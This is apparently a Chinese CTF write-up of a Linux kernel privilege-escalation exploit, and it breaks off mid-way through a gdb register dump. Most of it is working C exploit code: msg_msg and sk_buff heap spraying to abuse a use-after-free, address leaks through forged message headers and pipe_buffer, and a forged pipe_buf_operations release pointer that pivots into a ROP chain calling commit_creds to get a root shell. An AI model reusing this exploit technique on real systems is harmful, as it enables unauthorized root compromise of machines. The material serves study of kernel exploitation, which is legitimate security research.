<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line"><span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">add();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG; <span class="comment">/* MSG_TAG是一个标志位,后续会用到 */</span></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1024</span>) <span class="comment">/* 后续申请secondary_msg时,有极大概率占用这个object */</span></span><br><span class="line">        del();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局：</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656499343488-1663329194251.png" alt="1656499343488"> </p>
<ul>
<li>第一条消息（主消息）的大小为 96</li>
<li>第二条消息（辅助消息）的大小为 0x400</li>
<li>此时我们的辅助消息便有极大的概率获取到之前释放的 object</li>
</ul>
<p><strong>Step.II 构造 UAF，堆喷 sk_buff 定位 victim 队列</strong></p>
<p>虽然辅助消息有极大的概率获取到之前释放的 object，但是我们并不知道是哪一个辅助消息获取了 object（一共有 4096 个辅助消息）</p>
<p>可以通过堆喷 sk_buff 定位 victim 队列，而 sk_buff 的分配与释放则靠 socketpair 完成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spraySkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="comment">/* 利用socketpair完成sk_buff的分配,同时写入fake_secondary_msg */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* skb_shared_info需要在尾部取320字节,所以我们应该发送的buf的最大大小是1024-320=704 */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    del(); <span class="comment">/* 释放这个object,然后就会被socketpair申请的kernel heap占用 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 获取了object的辅助消息:msg_msg-&gt;m_ts从&#x27;0x400-0x30&#x27;被改为&#x27;0x400&#x27; */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* sk_buff分配完毕,获取了object的辅助消息被修改为fake_secondary_msg */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 因为获取了object的辅助消息被修改,所以使用MSG_COPY flag进行消息拷贝时便会失败,利用这个特性就可以确定该辅助消息的位置 */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* 把所有的sk_buff释放掉,之后可以再次申请命中UAF的消息队列 */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 socketpair 使用的也是 kernel heap 的空间，所以前面释放的 object 可能被 sk_buff 分配的空间占用（此时 object 仍然在被 secondary_msg 使用）</li>
<li>获取了 object 的辅助消息被修改为 fake_secondary_msg 后，所以使用 MSG_COPY flag 进行消息拷贝时便会失败</li>
<li>因此我们可以通过判断是否读取消息失败，来定位命中 UAF 的消息队列</li>
</ul>
<p><strong>Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址</strong></p>
<p>用同样的方法，将辅助消息被修改为 fake_secondary_msg，使 <code>msg_msg-&gt;m_ts</code> 变为一个较大值，从而越界读取到相邻辅助消息的 header（msg_msg），泄露出堆上地址</p>
<p>为了捕获正确的 msg_msg，前面设置的 MSG_TAG 标志位就有作用了</p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/1656586953394-1663329194251.png" alt="1656586953394">       </p>
<p><img src="/2022/06/30/msg_msg-sk_buff%E7%9A%84%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8+pipe_buffer%20attack/Users/ywx813/Desktop/2022暑假复现/d3kheap/wp/1656410685806.png" alt="1656410685806"> </p>
<ul>
<li>由于 slub 算法的特性，kmalloc-1k 会被分配到相邻的内存空间，kmalloc-96 会被分配到相邻的内存空间，两者互不干扰</li>
<li>msg_queue，primary，secondary 通过 <code>primary_msg-&gt;m_list</code> 与 <code>secondary_msg-&gt;m_list</code> 相关联</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 伪造msg_msg-&gt;m_ts为&quot;0x1000-sizeof(struct msg_msg)&quot; */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 注入fake_secondary_msg */</span></span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 越界读取到相邻辅助消息的header,泄露对应主消息的地址 */</span></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>); </span><br><span class="line">		<span class="comment">/* 利用MSG_TAG进行验证 */</span></span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">		<span class="comment">/* nearby_msg只是指向栈上某片区域的指针 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>越界读取到相邻辅助消息的 header，泄露对应主消息的地址</li>
<li>注意：同样是修改 <code>msg_msg</code>，上一个 <code>peekMsg</code> 就报错了，这里的 <code>peekMsg</code> 没有报错，目前不知道原因</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 伪造msg_msg-&gt;next为nearby_msg-&gt;m_list.prev-8(对应primary-&gt;header) */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        <span class="comment">/* 因为msg_msg-&gt;m_ts是一个很大的数,所以会启用msg_msgseg</span></span><br><span class="line"><span class="comment">        由于我们伪造了msg_msg-&gt;next,所以msg.mtext的前&quot;0x1000-0x30&quot;字节都没有用</span></span><br><span class="line"><span class="comment">        接下来的0x30字节就是primary-&gt;header */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">	<span class="comment">/* 泄露了primary中的数据,获取对应secondary-&gt;head */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>msg_msg data</code> 的 0x1000-0x30 空间使用完毕后，程序就会根据 <code>msg_msg-&gt;next</code> 来确定 <code>msg_msgseg data</code> 的位置</li>
<li>将 <code>msg_msg-&gt;next</code> 修改为 <code>primary-&gt;header</code>，就可以读取并泄露 <code>primary-&gt;m_list.next</code> ，也就是 <code>secondary-&gt;header</code></li>
<li>最后减去 0x400 就得到 victim_addr 了</li>
</ul>
<p><strong>Step.IV 堆喷 pipe_buffer，泄露内核基址</strong></p>
<p>第二条消息（辅助消息）的大小为 0x400，刚好可以申请 pipe_buffer，它既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 这里的victim_addr,SECONDARY_MSG_SIZE-sizeof(struct msg_msg),都是为了后面的readMsg可以成功 */</span></span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* 没有设置MSG_COPY,读取后便会从信息队列中释放secondary_msg</span></span><br><span class="line"><span class="comment">        释放时会进行某些检查,而buildMsg的操作就是为了通过这些检查 */</span></span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">        <span class="comment">/* 由于命中UAF的secondary_msg被释放,接下来的pipe_buffer也可能申请到这片区域 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg; <span class="comment">/* pipe_buf_ptr就是指向fake_secondary_msg的指针 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="comment">/* 由于pipe_buffer和sk_buff分配的区域在同一位置,所以pipe_buffer中的数据会被读取到fake_secondary_msg中 */</span></span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>readMsg 没有设置 MSG_COPY，读取后便会从信息队列中释放 secondary，但是 sk_buff 中的指针并没有置空，也就是说，pipe_buffer 和 sk_buff 分配的区域在同一位置</li>
<li>所以接下来的 read sk_sockets 会把 pipe_buffer 读到 fake_secondary_msg 中</li>
<li>最后通过 <code>pipe_buffer-&gt;ops</code> 获取内核偏移地址</li>
</ul>
<p><strong>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</strong></p>
<p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buf_operations-&gt;release</code> 这一指针</p>
<p>而 UAF object 的地址对我们而言是已知的，因此我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>]; <span class="comment">/* 伪造的pipe_buf_operations */</span></span><br><span class="line">ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset; <span class="comment">/* 伪造的pipe_buf_operations-&gt;release */</span></span><br><span class="line"></span><br><span class="line">rop_idx = <span class="number">0</span>;</span><br><span class="line">rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">rop_chain[rop_idx++] = user_cs;</span><br><span class="line">rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">rop_chain[rop_idx++] = user_sp;</span><br><span class="line">rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + PUSH_RSI_POP_RSP_POP_4VAL_RET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] free_pipe_info: %p\n&quot;</span>, kernel_offset + FREE_PIPE_INFO);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>标准的 ret2usr，利用 commit_creds(prepare_kernel_cred(0)) 进行提取</li>
<li>在 gadget 上打断点，进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  <span class="number">0xffffffff8e0dbede</span> ◂— push   rsi</span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x0</span></span><br><span class="line">*RDI  <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line">*RSI  <span class="number">0xffff9799c2864800</span> ◂— jns    <span class="number">0xffff9799c286486a</span> <span class="comment">/* 0x776f6c6c656879; &#x27;yhellow&#x27; */</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0xffff9799c22feee0</span> ◂— adc    byte ptr [rcx], <span class="number">4</span> <span class="comment">/* 0x3e800041180 */</span></span><br><span class="line"> R10  <span class="number">0x8</span></span><br><span class="line">*R11  <span class="number">0xffff9799c32d8c10</span> —▸ <span class="number">0xffff9799c1a49ba0</span> —▸ <span class="number">0xffff9799c21c6e40</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x200300000 */</span></span><br><span class="line">*R12  <span class="number">0xffff9799c285cd80</span> ◂— <span class="number">0</span></span><br><span class="line">*R13  <span class="number">0xffff9799c22fef68</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0xc000000000000 */</span></span><br><span class="line"> R14  <span class="number">0xffff9799c1a49ba0</span> —▸ <span class="number">0xffff9799c21c6e40</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x200300000 */</span></span><br><span class="line">*R15  <span class="number">0xffff9799c2308f00</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x240500000 */</span></span><br><span class="line">*RBP  <span class="number">0xffffa3aa004e3de0</span> —▸ <span class="number">0xffffa3aa004e3e08</span> —▸ <span class="number">0xffffa3aa004e3e30</span> —▸ <span class="number">0xffffa3aa004e3e68</span> —▸ <span class="number">0xffffa3aa004e3e78</span> ◂— ...</span><br><span class="line">*RSP  <span class="number">0xffffa3aa004e3dc8</span> —▸ <span class="number">0xffffffff8e1275fb</span> ◂— add    ebx, <span class="number">1</span></span><br><span class="line">*RIP  <span class="number">0xffffffff8e0dbede</span> ◂— push   rsi</span><br><span 